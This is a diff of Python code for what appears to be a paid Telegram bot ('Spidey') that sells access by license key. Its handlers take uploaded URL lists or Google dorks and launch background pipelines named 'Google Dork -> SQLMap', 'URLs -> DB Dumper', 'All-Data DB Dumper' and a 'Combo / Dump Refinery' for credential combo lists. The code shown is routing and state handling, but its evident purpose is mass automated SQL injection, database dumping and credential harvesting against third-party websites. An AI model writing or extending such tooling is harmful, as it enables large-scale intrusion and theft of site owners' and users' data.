+async def url_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    urls = [u.strip() for u in raw_text.splitlines() if u.strip().startswith("http")]
+    if not urls:
+        await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http.")
+        return URL_DUMP_WAIT
+    return _v12_spawn_bg_pipeline(uid, "URLs -> DB Dumper", _run_dump_pipeline(update, context, [], prefound_urls=urls[:500_000]))
+
+
+async def url_dump_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    urls = [u.strip() for u in (update.message.text or "").splitlines() if u.strip().startswith("http")]
+    if not urls:
+        await update.message.reply_text("❌ Nᴏ URLs Fᴏᴜɴᴅ. Uʀʟs Mᴜsᴛ Sᴛᴀʀᴛ Wɪᴛʜ http.")
+        return URL_DUMP_WAIT
+    return _v12_spawn_bg_pipeline(uid, "URLs -> DB Dumper", _run_dump_pipeline(update, context, [], prefound_urls=urls[:500_000]))
+
+
+_v12_orig_gdork_dump_handler = gdork_dump_handler
+
+
+async def gdork_dump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    dorks = [d.strip() for d in raw_text.splitlines() if d.strip()]
+    if not dorks:
+        await update.message.reply_text("❌ Nᴏ Dᴏʀᴋs Fᴏᴜɴᴅ Iɴ Fɪʟᴇ.")
+        return GDORK_DUMP_WAIT
+    return _v12_spawn_bg_pipeline(uid, "Google Dork -> SQLMap", _run_dump_pipeline(update, context, dorks))
+
+
+async def gdork_dump_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    return _v12_spawn_bg_pipeline(uid, "Google Dork -> SQLMap", _v12_orig_gdork_dump_handler(update, context))
+
+
+async def alldump_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    return _v12_spawn_bg_pipeline(uid, "All-Data DB Dumper", _v7_execute_alldump_for_user(update, context, raw_text))
+
+
+async def alldump_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    return _v12_spawn_bg_pipeline(uid, "All-Data DB Dumper", _v7_execute_alldump_for_user(update, context, update.message.text or ""))
+
+
+async def autopilot_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    return _v12_spawn_bg_pipeline(uid, "1-Click Auto-Pilot", _v9_run_autopilot_pipeline(update, context, raw_text))
+
+
+async def autopilot_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    return _v12_spawn_bg_pipeline(uid, "1-Click Auto-Pilot", _v9_run_autopilot_pipeline(update, context, update.message.text or ""))
+
+
+async def refinery_get_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = await _v9_download_and_vault_doc(update, context)
+    if "@" in raw_text and "://" not in raw_text[:500]:
+        context.user_data["rf_mode"] = "combo"
+    return _v12_spawn_bg_pipeline(uid, "Combo / Dump Refinery", _v9_run_refinery_input(update, context, raw_text))
+
+
+async def refinery_get_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text(), reply_markup=access_denied_kb(), parse_mode=ParseMode.MARKDOWN)
+        return MENU
+    raw_text = update.message.text or ""
+    if "@" in raw_text and "://" not in raw_text[:500]:
+        context.user_data["rf_mode"] = "combo"
+    return _v12_spawn_bg_pipeline(uid, "Combo / Dump Refinery", _v9_run_refinery_input(update, context, raw_text))
+
+
+# Support `.zip` AND `.txt` inside ALL 6 Pro Dork Generator commands (`/dkeywords`..`/dpf`)
+def _adork_make_conv(cmd, state, entry_fn, file_fn, text_fn):
+    return ConversationHandler(
+        entry_points=[CommandHandler(cmd, entry_fn)],
+        states={
+            state: [
+                MessageHandler(filters.Document.ALL, file_fn),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, text_fn),
+            ]
+        },
+        fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
+        allow_reentry=True,
+    )
+
+
+# ── PRIORITY PRE-HYDRATION (`group=-1`) + ZERO BLACK-HOLE CATCH-ALL (`group=1`) ─
+async def _v12_pre_router_guard(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """
+    Runs BEFORE `Group 0` (`group=-1`):
+      1. Drops ancient pre-boot queued messages (`> 10 min` old) safely without
+         ever dropping recent user inputs!
+      2. Re-hydrates `conv._conversations[(cid, uid)]` and `context.user_data`
+         from disk if missing in RAM!
+      3. Auto-redeems valid license keys pasted directly in ANY state!
+    """
+    msg = update.effective_message
+    usr = update.effective_user
+    chat = update.effective_chat
+    if not usr or not chat:
+        return
+
+    # Skip ancient backlog messages older than 10 minutes before boot
+    if msg and getattr(msg, "date", None) and not update.callback_query:
+        try:
+            if (_V12_BOOT_EPOCH - msg.date.timestamp()) > 600:
+                raise ApplicationHandlerStop
+        except ApplicationHandlerStop:
+            raise
+        except Exception:
+            pass
+
+    cid, uid = int(chat.id), int(usr.id)
+    k = f"{cid}:{uid}"
+    rec = _V12_PERSISTED_STATES.get(k)
+    if rec and _V12_CONV_REF is not None:
+        ud = rec.get("ud")
+        if isinstance(ud, dict):
+            for uk, uv in ud.items():
+                context.user_data.setdefault(uk, uv)
+        if (cid, uid) not in _V12_CONV_REF._conversations:
+            st = rec.get("state")
+            if isinstance(st, int):
+                _V12_CONV_REF._conversations[(cid, uid)] = st
+
+    # Instant direct License Key auto-redemption from ANY state (`MENU`, `PURCHASE_MENU`, `None`)!
+    if update.message and update.message.text and not update.message.text.startswith("/"):
+        cand = update.message.text.strip()
+        if cand in license_keys or re.match(r"^(?:LUCIFER|SPIDEY)-[A-Z0-9-]{6,}$", cand):
+            new_st = await redeem_key(update, context)
+            if _V12_CONV_REF is not None and isinstance(new_st, int):
+                _V12_CONV_REF._conversations[(cid, uid)] = new_st
+                _v12_record_user_state(cid, uid, new_st, context.user_data)
+            raise ApplicationHandlerStop
+
+
+    # Ensure state is NEVER `None` in `_V12_CONV_REF` — eliminates PTB's `if state is None: return None` black hole!
+    if _V12_CONV_REF is not None and (cid, uid) not in _V12_CONV_REF._conversations:
+        _V12_CONV_REF._conversations[(cid, uid)] = MENU
+
+
+# Upgrade `fallback` so BOTH unexpected text AND unexpected file uploads reply cleanly (never silent!)
+async def fallback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    msg = update.effective_message
+    uid = update.effective_user.id
+    all_user_ids.add(uid)
+    _save_users()
+    if has_access(uid):
+        await msg.reply_text(
+            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+            "```\n❀ 𝙎𝙥𝙞𝙙𝙚𝙮 🕷️ — 𝙒𝙞𝙩𝙝 𝙔𝙤𝙪𝙝 𝙁𝙤𝙧 𝙔𝙤𝙪𝙝..! ❀\n```"
+            "✿︎━━━━━━━━━━━━━━━━━━━━✿\n\n"
+            "💡 Sᴇʟᴇᴄᴛ A Mᴏᴅᴜʟᴇ Fʀᴏᴍ Tʜᴇ Mᴇɴᴜ Bᴇʟᴏᴡ 👇",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=make_main_menu(),
+        )
+    else:
+        await msg.reply_text(
+            access_denied_text(),
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=access_denied_kb(),
+        )
+    return MENU
+
+
+# Stamp live `[V12-IMMORTAL]` version right on top button of Admin Panel so Owner sees it in 1 second!
+_v12_prev_make_admin_menu = make_admin_menu
+
+
+def make_admin_menu():
+    kb = _v12_prev_make_admin_menu()
+    rows = []
+    for r in kb.inline_keyboard:
+        new_row = []
+        for b in r:
+            if b.callback_data == "admin_killall":
+                new_row.append(InlineKeyboardButton(f"☢️ FORCE KILL ALL TASKS [{_V12_VERSION_TAG}]", callback_data="admin_killall"))
+            else:
+                new_row.append(b)
+        rows.append(new_row)
+    return InlineKeyboardMarkup(rows)
+# ==================== END V12 BULLETPROOF PERSISTENT ROUTER & SINGLE-INSTANCE ENGINE ====================
 
 
 if __name__ == "__main__":
